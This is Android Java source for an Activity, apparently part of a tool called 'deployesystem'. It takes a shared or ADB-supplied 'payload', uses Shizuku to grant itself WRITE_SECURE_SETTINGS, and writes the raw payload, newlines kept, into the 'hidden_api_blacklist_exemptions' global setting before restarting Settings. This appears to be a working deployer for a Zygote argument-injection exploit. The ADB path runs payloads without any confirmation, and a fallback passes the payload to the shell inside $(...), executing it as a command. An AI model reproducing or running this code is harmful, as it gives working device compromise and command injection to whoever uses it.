package com.wqry085.deployesystem.next;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.ContentValues;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.widget.Toast;
import androidx.core.content.FileProvider;
import com.wqry085.deployesystem.MaterialDialogHelper;
import com.wqry085.deployesystem.ZygoteFragment;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;
import rikka.shizuku.Shizuku;

public class runpayload extends Activity {

    private Uri fileUri;
    private boolean fromAdbShell = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intent = getIntent();
        if (intent == null) {
            finish();
            return;
        }

        // 检查是否来自 ADB shell 的直接调用
        if (isFromAdbShell(intent)) {
            fromAdbShell = true;
            handleAdbShellIntent(intent);
            return;
        }

        // 原有逻辑：尝试获取分享的文件 URI
        fileUri = intent.getParcelableExtra(Intent.EXTRA_STREAM);

        // 如果 fileUri 为 null，尝试从 EXTRA_TEXT 获取文本
        if (fileUri == null) {
            String sharedText = intent.getStringExtra(Intent.EXTRA_TEXT);
            if (sharedText != null && !sharedText.isEmpty()) {
                try {
                    // 将文本写入临时文件
                    File tmp = new File(getCacheDir(), "payload.txt");
                    try (FileOutputStream fos = new FileOutputStream(tmp)) {
                        fos.write(sharedText.getBytes(StandardCharsets.UTF_8));
                    }
                    // 用 FileProvider 生成 Uri
                    fileUri = FileProvider.getUriForFile(
                            this,
                            getPackageName() + ".fileprovider",
                            tmp
                    );
                } catch (Exception e) {
                    Toast.makeText(this, "无法创建临时文件", Toast.LENGTH_SHORT).show();
                    finish();
                    return;
                }
            } else {
                Toast.makeText(this, "未接收到文件或文本", Toast.LENGTH_SHORT).show();
                finish();
                return;
            }
        }

        // 显示确认对话框
        showConfirmDialog();
    }

    /**
     * 检查是否来自 ADB shell 的调用
     */
    private boolean isFromAdbShell(Intent intent) {
        // 方式1：检查特定的 action
        if ("com.wqry085.deployesystem.ADB_RUN_PAYLOAD".equals(intent.getAction())) {
            return true;
        }
        
        // 方式2：检查特定的 extra 参数
        if (intent.hasExtra("adb_direct_run")) {
            return true;
        }
        
        // 方式3：检查来自 shell 用户的调用
        try {
            String callingPackage = getCallingPackage();
            if (callingPackage == null && intent.getStringExtra("from_adb") != null) {
                return true;
            }
        } catch (Exception e) {
            // 忽略异常
        }
        
        return false;
    }

    /**
     * 处理 ADB shell 的直接调用
     */
    private void handleAdbShellIntent(Intent intent) {
        String payload = null;
        
        // 优先从 extra 参数获取 payload
        if (intent.hasExtra("payload")) {
            payload = intent.getStringExtra("payload");
        } 
        // 其次从 EXTRA_TEXT 获取
        else if (intent.hasExtra(Intent.EXTRA_TEXT)) {
            payload = intent.getStringExtra(Intent.EXTRA_TEXT);
        }
        // 最后从 data 获取
        else if (intent.getData() != null && "content".equals(intent.getData().getScheme())) {
            try {
                payload = readContentFromUri(intent.getData());
            } catch (Exception e) {
                // 记录错误但不显示 UI
                finish();
                return;
            }
        }

        if (payload != null && !payload.trim().isEmpty()) {
            // 直接运行 payload，不显示对话框
            runpayload(payload); // 保持原始内容，不trim()
            finish();
        } else {
            // 如果没有 payload，直接结束
            finish();
        }
    }

    /**
     * 从 content URI 读取内容（保留换行符）
     */
    private String readContentFromUri(Uri uri) {
        try (InputStream inputStream = getContentResolver().openInputStream(uri);
             ByteArrayOutputStream baos = new ByteArrayOutputStream()) {
            
            if (inputStream == null) return null;
            
            byte[] buffer = new byte[8192];
            int read;
            while ((read = inputStream.read(buffer)) != -1) {
                baos.write(buffer, 0, read);
            }
            return baos.toString("UTF-8"); // 保留所有原始字符包括换行符
            
        } catch (Exception e) {
            return null;
        }
    }

    private void showConfirmDialog() {
        // 如果是 ADB 调用，直接运行不显示对话框
        if (fromAdbShell) {
            handleFile();
            return;
        }
        
        new AlertDialog.Builder(this)
                .setTitle("确定要加载第三方？")
                .setMessage("payload路径来源：" + fileUri.toString())
                .setCancelable(false)
                .setPositiveButton("运行payload", (dialog, which) -> handleFile())
                .setNegativeButton("取消", (dialog, which) -> {
                    dialog.dismiss();
                    finish();
                })
                .show();
    }

    /**
     * 处理文件内容（完全保留原始格式）
     */
    private void handleFile() {
        new Thread(() -> {
            String content = null;
            try (InputStream inputStream = getContentResolver().openInputStream(fileUri);
                 ByteArrayOutputStream baos = new ByteArrayOutputStream()) {

                if (inputStream == null) {
                    if (!fromAdbShell) {
                        runOnUiThread(() -> Toast.makeText(this, "无法打开文件", Toast.LENGTH_SHORT).show());
                    }
                    runOnUiThread(this::finish);
                    return;
                }

                byte[] buffer = new byte[8192];
                int read;
                while ((read = inputStream.read(buffer)) != -1) {
                    baos.write(buffer, 0, read);
                }
                // 直接转换为字符串，保留所有原始字符
                content = baos.toString(StandardCharsets.UTF_8.name());

            } catch (Exception e) {
                if (!fromAdbShell) {
                    final String msg = e.getMessage();
                    runOnUiThread(() -> Toast.makeText(this, "读取失败: " + msg, Toast.LENGTH_SHORT).show());
                }
                runOnUiThread(this::finish);
                return;
            }

            final String finalContent = content;
            runOnUiThread(() -> {
                try {
                    // 直接传递原始内容，不做任何修改
                    runpayload(finalContent);

                } catch (Exception e) {
                    if (!fromAdbShell) {
                        Toast.makeText(this, "处理失败: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                    }
                } finally {
                    finish();
                }
            });
        }).start();
    }

    /**
     * 运行 payload（完全保留原始格式）
     */
    public void runpayload(String payload) {
        // 授予权限
        ShizukuExec("pm grant com.wqry085.deployesystem android.permission.WRITE_SECURE_SETTINGS");
        ShizukuExec("am force-stop com.android.settings");
        
        // 方法1：使用 base64 编码写入，避免 shell 转义问题（推荐）
        writePayloadWithBase64(payload);
        
        // 方法2：直接写入 settings（保持原始内容）
        ContentValues values = new ContentValues();
        values.put(Settings.Global.NAME, "hidden_api_blacklist_exemptions");
        values.put(Settings.Global.VALUE, payload); // 直接使用原始 payload
        try {
            getContentResolver().insert(Uri.parse("content://settings/global"), values);
            if (!fromAdbShell) {
                Toast.makeText(this, "payload 加载成功", Toast.LENGTH_SHORT).show();
            }
        } catch (Exception e) {
            if (!fromAdbShell) {
                MaterialDialogHelper.showSimpleDialog(this, "加载payload失败", e.toString());
            }
        }
        
        // 重启 Settings
        ShizukuExec("am start -n com.android.settings/.Settings");
        
        // 延迟恢复（可选）
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            ContentValues values2 = new ContentValues();
            values2.put(Settings.Global.NAME, "hidden_api_blacklist_exemptions");
            values2.put(Settings.Global.VALUE, "null");
            try {
                getContentResolver().insert(Uri.parse("content://settings/global"), values2);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }, 200);
    }

    /**
     * 使用 base64 编码写入文件，完美保留所有字符
     */
    private void writePayloadWithBase64(String payload) {
        try {
            // 将 payload 进行 base64 编码
            String base64Payload = android.util.Base64.encodeToString(
                payload.getBytes(StandardCharsets.UTF_8), 
                android.util.Base64.NO_WRAP
            );
            
            // 写入 base64 编码的内容
            ShizukuExec("echo '" + base64Payload + "' | base64 -d > /data/local/tmp/只读配置.txt");
            
        } catch (Exception e) {
            // 如果 base64 方法失败，回退到 printf 方法
            writePayloadWithPrintf(payload);
        }
    }

    /**
     * 使用 printf 写入文件（备用方法）
     */
    private void writePayloadWithPrintf(String payload) {
        try {
            // 转义单引号和其他特殊字符
            String escapedPayload = payload
                .replace("'", "'\"'\"'")  // 转义单引号
                .replace("\\", "\\\\")    // 转义反斜杠
                .replace("$", "\\$")      // 转义美元符号
                .replace("`", "\\`")      // 转义反引号
                .replace("\"", "\\\"");   // 转义双引号
            
            // 使用 printf 写入，保持所有格式
            ShizukuExec("printf '%s' '" + escapedPayload + "' > /data/local/tmp/只读配置.txt");
            
        } catch (Exception e) {
            // 最后尝试直接 echo
            ShizukuExec("echo \"$(" + payload + ")\" > /data/local/tmp/只读配置.txt");
        }
    }

    public static String ShizukuExec(String cmd) {
        StringBuilder output = new StringBuilder();
        try {
            Process p = Shizuku.newProcess(new String[]{"sh"}, null, null);
            OutputStream out = p.getOutputStream();
            out.write((cmd + "\nexit\n").getBytes());
            out.flush();
            out.close();
            BufferedReader mReader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String inline;
            while ((inline = mReader.readLine()) != null) {
                output.append(inline).append("\n");
            }
            BufferedReader errorReader = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            while ((inline = errorReader.readLine()) != null) {
                output.append(inline).append("\n");
            }

            int exitCode = p.waitFor();
            if (exitCode != 0) {
                output.append("漏洞部署结束: ").append(exitCode);
            }
            return output.toString();
        } catch (Exception e) {
            e.printStackTrace();
            return e.toString();
        }
    }
}